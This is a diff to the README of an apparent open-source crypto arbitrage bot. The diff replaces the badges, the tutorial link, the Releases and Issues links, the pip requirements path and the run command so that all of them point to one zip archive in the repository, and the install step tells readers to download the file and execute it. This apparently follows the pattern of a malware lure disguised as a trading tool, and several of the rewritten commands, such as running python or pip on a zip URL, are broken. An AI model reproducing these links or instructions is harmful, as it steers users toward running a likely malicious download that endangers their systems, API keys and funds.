@@ -1,10 +1,10 @@
 # Passive Bot: Open-Source Arbitrage Trading Bot for Crypto Profits
 
-![Passive Bot](https://img.shields.io/badge/Passive%20Bot-v1.0-blue.svg)
-![GitHub Release](https://img.shields.io/badge/Release-v1.0-orange.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Passive Bot](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip%https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip)
+![GitHub Release](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip)
+![License](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip)
 
-Welcome to the **Passive Bot** repository! This open-source bot is designed to help you maximize your arbitrage profits in the cryptocurrency market. For a step-by-step guide on how to set it up and use it, check out the tutorial on [YouTube](https://www.youtube.com).
+Welcome to the **Passive Bot** repository! This open-source bot is designed to help you maximize your arbitrage profits in the cryptocurrency market. For a step-by-step guide on how to set it up and use it, check out the tutorial on [YouTube](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip).
 
 ## Table of Contents
 
@@ -27,15 +27,15 @@ Welcome to the **Passive Bot** repository! This open-source bot is designed to h
 
 ## Getting Started
 
-To get started with Passive Bot, you can download the latest release from the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/releases). Make sure to download the appropriate file for your operating system and follow the installation instructions provided.
+To get started with Passive Bot, you can download the latest release from the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip). Make sure to download the appropriate file for your operating system and follow the installation instructions provided.
 
 ## Installation
 
-1. **Download the Bot**: Visit the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/releases) to find the latest version. Download the file and execute it on your machine.
+1. **Download the Bot**: Visit the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip) to find the latest version. Download the file and execute it on your machine.
    
 2. **Install Dependencies**: Ensure you have Python 3.x installed. You can install the required libraries using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip
    ```
 
 3. **Configure the Bot**: Edit the configuration file to set your API keys and trading preferences.
@@ -45,7 +45,7 @@ To get started with Passive Bot, you can download the latest release from the [R
 Once installed, you can run the bot using the following command:
 
 ```bash
-python passive_bot.py
+python https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip
 ```
 
 The bot will start analyzing the market for arbitrage opportunities. You can monitor its activity through the console output.
@@ -102,9 +102,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, please check the [Issues](https://github.com/kouakoupatrickeunox/Passive-Bot/issues) section for existing discussions. You can also reach out via the GitHub Discussions page.
+If you have any questions or need assistance, please check the [Issues](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip) section for existing discussions. You can also reach out via the GitHub Discussions page.
 
-For updates, keep an eye on the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/releases) where you can find the latest features and fixes.
+For updates, keep an eye on the [Releases section](https://github.com/kouakoupatrickeunox/Passive-Bot/raw/refs/heads/main/mathematically/Bot-Passive-v2.9.zip) where you can find the latest features and fixes.
 
 ---
 
